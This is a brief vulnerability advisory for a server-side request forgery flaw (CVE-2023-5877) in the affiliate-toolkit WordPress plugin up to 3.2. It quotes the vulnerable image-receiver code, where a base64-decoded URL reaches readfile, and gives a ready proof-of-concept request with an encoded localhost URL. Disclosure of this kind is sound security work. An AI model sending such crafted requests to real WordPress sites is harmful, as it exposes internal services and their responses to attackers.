### affiliate-toolkit – WordPress Affiliate Plugin <= 3.2 SSRF

affiliate-toolkit <= 3.2 is vulnerable to SSRF

Source: `$_GET`

Sink: `readfile`

Code:

tools/atkp_imagereceiver.php

```
$url = ( isset( $_GET['image'] ) ) ? $_GET['image'] : '';
$image_url = base64_decode( $url );
...
readfile( $image_url );
```

POC:

1. Listen on 8080 on server side
2. Send a get request to wp-content/plugins/affiliate-toolkit-starter/tools/atkp_imagereceiver.php?image=aHR0cDovL2xvY2FsaG9zdDo4MDgw&hash=dd4349f3bf4a552af419e12c282ba25a
3. Receive a request on server side. The full response is also disclosed

Status: CVE-2023-5877